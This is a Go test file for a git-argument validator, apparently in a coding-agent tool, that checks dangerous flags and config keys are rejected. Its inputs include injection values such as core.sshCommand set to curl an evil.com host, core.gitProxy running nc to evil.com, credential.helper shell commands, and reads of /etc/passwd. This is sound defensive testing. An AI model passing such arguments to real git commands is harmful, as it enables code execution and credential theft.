package tools

import (
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// ValidateGitArgs - Safe args should pass
// ---------------------------------------------------------------------------

func TestValidateGitArgs_SafeArgs(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"empty args", ""},
		{"simple add", "file.go"},
		{"add multiple files", "file1.go file2.go file3.go"},
		{"push with remote", "origin main"},
		{"push with force", "--force origin main"},
		{"commit with message", "-m 'test commit'"},
		{"log with options", "--oneline -10"},
		{"diff with commit", "HEAD~1"},
		{"checkout new branch", "-b feature/new-feature"},
		{"branch delete", "-d feature/old-feature"},
		{"reset hard", "--hard HEAD~1"},
		{"rebase", "main"},
		{"merge", "feature-branch"},
		{"tag", "v1.0.0"},
		{"tag annotate", "-a v1.0.0 -m 'release'"},
		{"clean", "-fd"},
		{"stash", "save"},
		{"stash pop", "pop"},
		{"apply patch", "fix.patch"},
		{"cherry-pick", "abc123def456"},
		{"revert", "abc123def456"},
		{"verbose flag", "--verbose"},
		{"quiet flag", "--quiet"},
		{"dry-run flag", "--dry-run"},
		{"status with porcelain", "--porcelain"},
		{"amend", "--amend"},
		{"no-verify", "--no-verify"},
		{"set-upstream", "--set-upstream origin main"},
		{"path with exec in name", "src/executor/main.go"},
		{"path with remote in name", "remote-handler.go"},
		{"no-recurse-submodules negation", "--no-recurse-submodules"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err != nil {
				t.Errorf("ValidateGitArgs(%q) returned unexpected error: %v", tt.args, err)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// ValidateGitArgs - Safe -c flags (-c with non-dangerous config keys)
// ---------------------------------------------------------------------------

func TestValidateGitArgs_SafeCFlags(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"user.name", "-c user.name='Test User'"},
		{"user.email", "-c user.email='test@example.com'"},
		{"commit.gpgSign", "-c commit.gpgSign=false"},
		{"init.defaultBranch", "-c init.defaultBranch=main"},
		{"alias.co", "-c alias.co=checkout"},
		{"advice.detachedHead", "-c advice.detachedHead=false"},
		{"color.ui", "-c color.ui=auto"},
		{"pull.rebase", "-c pull.rebase=true"},
		{"core.autocrlf", "-c core.autocrlf=input"},
		{"core.pager", "-c core.pager=cat"},
		{"core.compression", "-c core.compression=0"},
		{"core.excludesFile", "-c core.excludesFile=~/.gitignore_global"},
		{"core.eol", "-c core.eol=lf"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err != nil {
				t.Errorf("ValidateGitArgs(%q) returned unexpected error: %v", tt.args, err)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// ValidateGitArgs - Command execution flags (CRITICAL)
// ---------------------------------------------------------------------------

func TestValidateGitArgs_UploadPack(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"full flag equals", "--upload-pack=evil.sh"},
		{"full flag space", "--upload-pack evil.sh"},
		{"abbreviation CVE-2025-66032", "--upload-pa=evil.sh"},
		{"with target", "--upload-pack=/tmp/evil origin master"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error but got nil", tt.args)
			}
			if !strings.Contains(err.Error(), "upload-pa") {
				t.Errorf("Error should mention upload-pa pattern but got: %v", err)
			}
			if !strings.Contains(err.Error(), "command execution") {
				t.Errorf("Error should mention 'command execution' category but got: %v", err)
			}
		})
	}
}

func TestValidateGitArgs_ReceivePack(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"full flag equals", "--receive-pack=evil.sh"},
		{"full flag space", "--receive-pack evil.sh"},
		{"abbreviation", "--receive-pa=evil.sh"},
		{"with target", "--receive-pack=/tmp/evil origin master"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error but got nil", tt.args)
			}
			if !strings.Contains(err.Error(), "receive-pa") {
				t.Errorf("Error should mention receive-pa pattern but got: %v", err)
			}
			if !strings.Contains(err.Error(), "command execution") {
				t.Errorf("Error should mention 'command execution' category but got: %v", err)
			}
		})
	}
}

func TestValidateGitArgs_Exec(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"equals form", "--exec=evil.sh"},
		{"space separated", "--exec evil.sh"},
		{"with position", "--exec=/tmp/evil origin"},
		{"abbreviation --exe", "--exe=evil.sh"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error but got nil", tt.args)
			}
			if !strings.Contains(err.Error(), "--exe") {
				t.Errorf("Error should mention --exe pattern but got: %v", err)
			}
			if !strings.Contains(err.Error(), "command execution") {
				t.Errorf("Error should mention 'command execution' category but got: %v", err)
			}
		})
	}
}

// Verify that --exec in a file path does NOT trigger false positive
func TestValidateGitArgs_Exec_NoFalsePositiveOnFilePath(t *testing.T) {
	err := ValidateGitArgs("src/executor/main.go")
	if err != nil {
		t.Errorf(" ValidateGitArgs should allow file paths containing 'exec' but got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// ValidateGitArgs - Config injection via -c (CRITICAL)
// ---------------------------------------------------------------------------

func TestValidateGitArgs_ConfigInjection_CoreKeys(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"core.hooksPath", "-c core.hooksPath=/tmp/evil"},
		{"core.gitProxy", "-c core.gitProxy=evil.sh"},
		{"core.sshCommand", "-c core.sshCommand='evil'"},
		{"core.fsmonitor", "-c core.fsmonitor=evil"},
		{"compact form hooksPath", "-ccore.hooksPath=/tmp/evil"},
		{"compact form gitProxy", "-ccore.gitProxy=evil.sh"},
		{"compact form sshCommand", "-ccore.sshCommand='evil'"},
		{"compact form fsmonitor", "-ccore.fsmonitor=evil"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error but got nil", tt.args)
			}
			if !strings.Contains(err.Error(), "config injection") {
				t.Errorf("Error should mention 'config injection' category but got: %v", err)
			}
		})
	}
}

func TestValidateGitArgs_ConfigInjection_CredentialHelper(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"credential.helper with bang", "-c credential.helper=!sh -c 'evil'"},
		{"credential.helper abbreviation", "-c credential.h=!sh"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error but got nil", tt.args)
			}
			if !strings.Contains(err.Error(), "config injection") {
				t.Errorf("Error should mention 'config injection' category but got: %v", err)
			}
		})
	}
}

func TestValidateGitArgs_ConfigInjection_RemoteKeys(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"remote.origin.uploadpack", "-c remote.origin.uploadpack=evil"},
		{"remote.origin.receivepack", "-c remote.origin.receivepack=evil"},
		{"remote.origin.proxy", "-c remote.origin.proxy=evil"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error but got nil", tt.args)
			}
			if !strings.Contains(err.Error(), "config injection") {
				t.Errorf("Error should mention 'config injection' category but got: %v", err)
			}
		})
	}
}

func TestValidateGitArgs_ConfigInjection_URLKeys(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"url insteadOf", "-c url.ssh://.insteadOf=https://"},
		{"url pushInsteadOf", "-c url.ssh://.pushInsteadOf=https://"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error but got nil", tt.args)
			}
			if !strings.Contains(err.Error(), "config injection") {
				t.Errorf("Error should mention 'config injection' category but got: %v", err)
			}
		})
	}
}

func TestValidateGitArgs_ConfigInjection_ProtocolKeys(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"protocol.allow", "-c protocol.allow=always"},
		{"protocol.file.allow", "-c protocol.file.allow=always"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error but got nil", tt.args)
			}
			if !strings.Contains(err.Error(), "config injection") {
				t.Errorf("Error should mention 'config injection' category but got: %v", err)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// ValidateGitArgs - Config injection via --config (CRITICAL)
// ---------------------------------------------------------------------------

func TestValidateGitArgs_ConfigFlag(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		// Equals form (single token): --config=key=value
		{"--config= core.hooksPath", "--config=core.hooksPath=/tmp/evil"},
		{"--config= core.gitProxy", "--config=core.gitProxy=evil"},
		{"--config= core.sshCommand", "--config=core.sshCommand=evil"},
		{"--config= credential.helper", "--config=credential.helper=!sh"},
		// Space form (two tokens): --config key=value
		{"--config space core.hooksPath", "--config core.hooksPath=/tmp/evil"},
		{"--config space credential.helper", "--config credential.helper=!sh"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error but got nil", tt.args)
			}
			if !strings.Contains(err.Error(), "config injection") {
				t.Errorf("Error should mention 'config injection' category but got: %v", err)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// ValidateGitArgs - Directory manipulation (HIGH)
// ---------------------------------------------------------------------------

func TestValidateGitArgs_DirectoryManipulation(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"--git-dir full", "--git-dir=/tmp/evil"},
		{"--git-dir abbreviation", "--git-di=/tmp/evil"},
		{"--git-dir shorter abbreviation", "--git-d=/tmp/evil"},
		{"--work-tree full", "--work-tree=/tmp/evil"},
		{"--work-tree abbreviation", "--work-tre=/tmp/evil"},
		{"--work-tree shorter abbreviation", "--work-t=/tmp/evil"},
		{"--prefix equals", "--prefix=/tmp/evil"},
		{"--prefix space", "--prefix /tmp/evil"},
		{"--prefix abbreviation", "--pref=/tmp/evil"},
		{"--separate-git-dir", "--separate-git-dir=/tmp/evil"},
		{"--separate-git-dir abbreviation", "--separate-git-di=/tmp/evil"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error but got nil", tt.args)
			}
			if !strings.Contains(err.Error(), "directory escape") {
				t.Errorf("Error should mention 'directory escape' category but got: %v", err)
			}
		})
	}
}

// -C (uppercase) is the directory escape flag; -c (lowercase) is config
func TestValidateGitArgs_CFlag_DirectoryEscape(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"-C with space", "-C /tmp/evil"},
		{"-C with attached path", "-C/tmp/evil"},
		{"-C with relative path", "-C ../../etc"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error but got nil", tt.args)
			}
			if !strings.Contains(err.Error(), "directory escape") {
				t.Errorf("Error should mention 'directory escape' category but got: %v", err)
			}
		})
	}
}

// -c (lowercase) with safe config keys should NOT be blocked
func TestValidateGitArgs_LowerCFlag_IsConfig_NotBlocked(t *testing.T) {
	err := ValidateGitArgs("-c user.name='Test'")
	if err != nil {
		t.Errorf("ValidateGitArgs should allow -c (lowercase config flag) but got: %v", err)
	}
}

// --template flag
func TestValidateGitArgs_TemplateFlag(t *testing.T) {
	err := ValidateGitArgs("--template=/tmp/evil")
	if err == nil {
		t.Fatal("ValidateGitArgs should reject --template")
	}
	if !strings.Contains(err.Error(), "hook injection") {
		t.Errorf("Error should mention 'hook injection' category but got: %v", err)
	}
}

// filter.* config keys (CVE-2026-25053)
func TestValidateGitArgs_ConfigInjection_FilterKeys(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"filter.evil.clean", "-c filter.evil.clean='cat /etc/passwd'"},
		{"filter.evil.smudge", "-c filter.evil.smudge='curl http://evil.com'"},
		{"compact form filter", "-cfilter.evil.clean='evil'"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error but got nil", tt.args)
			}
			if !strings.Contains(err.Error(), "config injection") {
				t.Errorf("Error should mention 'config injection' category but got: %v", err)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// ValidateGitArgs - Submodule execution (HIGH)
// ---------------------------------------------------------------------------

func TestValidateGitArgs_SubmoduleExecution(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"--recursive", "--recursive"},
		{"--recursive abbreviation", "--recurs"},
		{"--recurse-submodules", "--recurse-submodules"},
		{"--recurse-submodules abbreviation", "--recurse-s"},
		{"--recurse-submodules with value", "--recurse-submodules=on"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error but got nil", tt.args)
			}
			if !strings.Contains(err.Error(), "submodule") {
				t.Errorf("Error should mention 'submodule' but got: %v", err)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// ValidateGitArgs - Other dangerous flags
// ---------------------------------------------------------------------------

func TestValidateGitArgs_FilterFlag(t *testing.T) {
	err := ValidateGitArgs("--filter=blob:none")
	if err == nil {
		t.Fatal("ValidateGitArgs should reject --filter")
	}
	if !strings.Contains(err.Error(), "filter injection") {
		t.Errorf("Error should mention 'filter injection' category but got: %v", err)
	}
}

func TestValidateGitArgs_RemoteEquals(t *testing.T) {
	err := ValidateGitArgs("--remote=/tmp/evil.sh")
	if err == nil {
		t.Fatal("ValidateGitArgs should reject --remote=")
	}
	if !strings.Contains(err.Error(), "remote manipulation") {
		t.Errorf("Error should mention 'remote manipulation' category but got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// ValidateGitArgs - Case sensitivity
// ---------------------------------------------------------------------------

func TestValidateGitArgs_CaseInsensitive(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"UPPERCASE upload-pack", "--UPLOAD-PACK=evil"},
		{"MixedCase upload-pack", "--UpLoAd-PaCk=evil"},
		{"-c CORE.", "-c CORE.HOOKSPATH=/tmp/evil"},
		{"-c MixedCase Core", "-c Core.HooksPath=/tmp/evil"},
		{"--GIT-DIR", "--GIT-DIR=/tmp/evil"},
		{"--GIT-DI", "--GIT-DI=/tmp/evil"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error (case insensitive) but got nil", tt.args)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// ValidateGitArgs - Complex attack scenarios
// ---------------------------------------------------------------------------

func TestValidateGitArgs_AttackScenarios(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"CVE-2025-66032 abbreviation bypass", "--upload-pa=evil attacker.com/repo"},
		{"dangerous flag after safe args", "origin main --upload-pack=evil"},
		{"dangerous flag before safe args", "--receive-pack=evil origin main"},
		{"dangerous flag in middle", "origin --receive-pack=evil main"},
		{"-c credential helper shell injection", "-c credential.helper='!sh -c evil'"},
		{"multiple -c flags one dangerous", "-c user.name=evil -c core.hooksPath=/tmp"},
		{"--config with equals", "--config=core.hooksPath=/tmp/evil origin main"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error but got nil", tt.args)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Blocklist completeness audit
// ---------------------------------------------------------------------------

func TestGitBlocklist_Structure(t *testing.T) {
	for i, entry := range gitBlocklist {
		if entry.pattern == "" {
			t.Errorf("gitBlocklist[%d] has empty pattern", i)
		}
		if entry.category == "" {
			t.Errorf("gitBlocklist[%d] has empty category", i)
		}
		if entry.reason == "" {
			t.Errorf("gitBlocklist[%d] has empty reason", i)
		}
		if entry.check == nil {
			t.Errorf("gitBlocklist[%d] has nil check function", i)
		}
	}
}

func TestGitBlocklist_CoversCriticalAttackVectors(t *testing.T) {
	// Each of these attack vectors must be caught by the blocklist
	criticalAttacks := []struct {
		desc string
		args string
	}{
		{"--upload-pack command execution", "--upload-pack='touch /tmp/pwned'"},
		{"--receive-pack command execution", "--receive-pack='touch /tmp/pwned'"},
		{"--exec command execution", "--exec=/tmp/evil"},
		{"-c core.hooksPath RCE", "-c core.hooksPath=/tmp/evil"},
		{"-c core.sshCommand exfil", "-c core.sshCommand='curl http://evil.com'"},
		{"-c credential.helper exfil", "-c credential.helper='!cat /etc/passwd'"},
		{"-c core.gitProxy RCE", "-c core.gitProxy='nc evil.com 4444'"},
		{"-c core.fsmonitor RCE", "-c core.fsmonitor='evil.sh'"},
		{"-c remote.origin.uploadpack RCE", "-c remote.origin.uploadpack='evil.sh'"},
		{"-c url exfil", "-c url.https://evil.com/.insteadOf=https://github.com/"},
		{"-c protocol enable file", "-c protocol.file.allow=always"},
		{"-c filter clean RCE", "-c filter.evil.clean='cat /etc/passwd'"},
		{"-c filter smudge RCE", "-c filter.evil.smudge='curl http://evil.com'"},
		{"--config= equals RCE", "--config=core.hooksPath=/tmp/evil"},
		{"--config space RCE", "--config core.hooksPath=/tmp/evil"},
		{"-C directory escape", "-C /tmp"},
		{"--git-dir escape", "--git-dir=/tmp/evil"},
		{"--work-tree escape", "--work-tree=/tmp/evil"},
		{"--separate-git-dir escape", "--separate-git-dir=/tmp/evil"},
		{"--recursive submodule RCE", "--recursive"},
		{"--recurse-submodules RCE", "--recurse-submodules"},
		{"--filter injection", "--filter=blob:none"},
		{"--remote= injection", "--remote=/tmp/evil.sh"},
		{"--template hook injection", "--template=/tmp/evil"},
	}

	for _, attack := range criticalAttacks {
		t.Run(attack.desc, func(t *testing.T) {
			err := ValidateGitArgs(attack.args)
			if err == nil {
				t.Errorf("Blocklist should catch %s but ValidateGitArgs(%q) returned nil", attack.desc, attack.args)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Integration with ExecuteGitOperation
// ---------------------------------------------------------------------------

func TestExecuteGitOperation_RejectsDangerousArgs(t *testing.T) {
	tests := []struct {
		name      string
		operation GitOperationType
		args      string
	}{
		{"push with --upload-pack", GitOpPush, "--upload-pack=evil origin main"},
		{"push with --receive-pack", GitOpPush, "--receive-pack=evil origin main"},
		{"add with --exec", GitOpAdd, "--exec=evil"},
		{"checkout with --git-dir", GitOpCheckout, "--git-dir=/tmp"},
		{"rm with --recursive", GitOpRm, "--recursive"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			op := GitOperation{Operation: tt.operation, Args: tt.args}
			// Use a prompter that would approve — validation should reject before approval
			prompter := &alwaysApprovePrompter{}
			_, err := ExecuteGitOperation(t.Context(), op, "test-session", nil, prompter)
			if err == nil {
				t.Fatalf("ExecuteGitOperation should reject dangerous args %q but got nil error", tt.args)
			}
			if !strings.Contains(err.Error(), "rejected dangerous git flag") {
				t.Errorf("Error should mention rejected flag but got: %v", err)
			}
		})
	}
}

// alwaysApprovePrompter approves all requests — used to verify validation runs before approval
type alwaysApprovePrompter struct{}

func (p *alwaysApprovePrompter) PromptForApproval(command string) (bool, error) {
	return true, nil
}

// ---------------------------------------------------------------------------
// ValidateGitArgs - Whitespace delimiter injection (regression: tab/newline bypass)
// ---------------------------------------------------------------------------
// Git accepts tabs, newlines, and multiple spaces as delimiters between a flag
// and its value. A literal "-c core." substring check is defeated by
// "-c\tcore.hooksPath=...". configKeyPrefix now normalizes whitespace via
// strings.Fields before the substring checks, so these variants must be caught.

func TestValidateGitArgs_ConfigInjection_WhitespaceDelimiters(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"tab between -c and key", "-c\tcore.hooksPath=/tmp/evil"},
		{"newline between -c and key", "-c\ncore.hooksPath=/tmp/evil"},
		{"multiple spaces between -c and key", "-c  core.hooksPath=/tmp/evil"},
		{"tab + surrounding args", "log -c\tcore.hooksPath=/tmp/evil --oneline"},
		{"tab on gitProxy", "-c\tcore.gitProxy=evil.sh"},
		{"tab on sshCommand", "-c\tcore.sshCommand=evil"},
		{"tab on fsmonitor", "-c\tcore.fsmonitor=evil"},
		{"tab on credential", "-c\tcredential.helper=!sh"},
		{"tab on remote", "-c\tremote.origin.uploadpack=evil"},
		{"tab on filter", "-c\tfilter.evil.clean=cat /etc/passwd"},
		{"carriage return between -c and key", "-c\r\ncore.hooksPath=/tmp/evil"},
		{"vertical tab", "-c\vcore.hooksPath=/tmp/evil"},
		{"form feed", "-c\fcore.hooksPath=/tmp/evil"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err == nil {
				t.Fatalf("ValidateGitArgs(%q) should have returned error (whitespace delimiter bypass) but got nil", tt.args)
			}
			if !strings.Contains(err.Error(), "config injection") {
				t.Errorf("Error should mention 'config injection' category but got: %v", err)
			}
		})
	}
}

// Safe -c flags with whitespace must not be false-positive blocked.
// This guards against the normalization being too aggressive.
func TestValidateGitArgs_SafeCFlags_WithTabs(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"safe user.name with tab", "-c\tuser.name=Test"},
		{"safe core.autocrlf with multiple spaces", "-c  core.autocrlf=false"},
		{"safe core.pager with newline", "-c\ncore.pager=cat"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateGitArgs(tt.args)
			if err != nil {
				t.Errorf("ValidateGitArgs(%q) should allow safe -c flag but got: %v", tt.args, err)
			}
		})
	}
}
